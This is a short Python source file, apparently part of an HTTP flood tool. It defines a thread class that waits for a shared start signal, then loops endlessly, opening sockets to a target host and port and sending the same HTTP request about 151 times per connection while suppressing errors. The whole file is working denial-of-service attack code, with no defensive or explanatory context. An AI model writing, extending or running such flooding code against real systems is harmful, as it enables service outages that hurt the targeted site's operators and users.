import threading, socket



# request, args, counter, go ,frame_info

class RequestDefaultHTTP(threading.Thread):
    def __init__(self, request, args, counter, go ,frame_info ):
        threading.Thread.__init__(self)
        self.counter = counter
        self.go = go
        self.frame_info = frame_info
        self.request = request
        self.args = args

    def run(self):
        self.go.wait()
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(self.args.host), int(self.args.port)))
                s.send(str.encode(self.request))
                print("Request is sent :", self.counter)
                try:
                    for y in range(150):
                        s.send(str.encode(self.request))
                except:
                    print(f"Exception in line : {self.frame_info.lineno} , {self.__class__.__name__} ")
                    s.close()
            except:
                print(f"Socket is not created line: {self.frame_info.lineno} , {self.__class__.__name__}")


